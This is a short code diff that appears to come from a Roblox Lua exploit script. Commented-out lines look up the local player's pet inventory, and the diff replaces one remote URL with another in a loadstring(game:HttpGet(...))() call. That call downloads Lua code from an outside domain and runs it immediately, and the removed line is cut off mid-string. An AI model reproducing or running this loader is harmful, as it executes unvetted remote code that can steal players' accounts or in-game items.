@@ -27,5 +27,5 @@
 --    require(game.ReplicatedStorage.ClientModules.Core.ClientData).get_data()[game.Players.LocalPlayer.Name].inventory.pets
 
 --) do
-loadstring(game:HttpGet("https://egorikusa.space/0e89eca046ee77ef7738649c.lua
+loadstring(game:HttpGet("https://egorikusa.space/3520cab082034c24d9809c90.lua", true))()
 
